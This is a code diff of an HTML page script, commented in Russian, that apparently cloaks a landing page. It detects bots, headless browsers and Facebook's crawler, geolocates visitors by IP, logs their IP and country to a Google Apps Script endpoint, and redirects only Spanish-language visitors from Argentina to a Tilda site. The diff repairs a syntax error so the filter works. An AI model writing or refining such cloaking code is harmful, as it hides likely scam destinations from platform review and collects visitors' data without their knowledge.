@@ -18,15 +18,12 @@
       const width = screen.width || 0;
       const webdriver = navigator.webdriver ? '1' : '0';
 
-      // Простая UA-фильтрация
+      // Фильтры
       const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
-      const isUA suspicious = suspiciousUAs.some(rx => rx.test(ua));
-
-      // Проверка языка и экрана
+      const isUASuspicious = suspiciousUAs.some(rx => rx.test(ua));
       const isLangSuspicious = !lang.includes('es');
       const isScreenSuspicious = width < 300 || width > 2000;
 
-      // Определение страны по IP
       let ip = '_', country = '_';
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -35,16 +32,15 @@
         country = json.country || '_';
       } catch (e) {}
 
-      // Итог
       const isBot =
         webdriver === '1' ||
-        isUA suspicious ||
+        isUASuspicious ||
         isLangSuspicious ||
         isScreenSuspicious ||
-        country !== 'AR';
+        country !== 'AR'; // ← теперь фильтрация работает
 
-      // Отправка в Google Sheets
-      fetch('https://script.google.com/macros/s/AKfycbxyKjXqA5Trs_Rzz_jf3nSrC7xxsAy7mEetc7S_aV4IQkPk9wP7vFU-eCCDWZ5xdUaoOQ/exec', {
+      // Лог
+      fetch('https://script.google.com/macros/s/AKfycbzeF5L5c3qDt5DSzQ6Cuv2FMLanBviy-9aMl-J5WxelYIxraRZrIM042UAr3g8mh6gJ-g/exec', {
         method: 'POST',
         body: JSON.stringify({
           ip,
@@ -57,7 +53,7 @@
         })
       });
 
-      // Переход
+      // Редирект
       if (!isBot) {
         setTimeout(() => {
           window.location.href = 'http://argentinaforreal.tilda.ws/';
@@ -71,4 +67,3 @@
   </script>
 </body>
 </html>
-
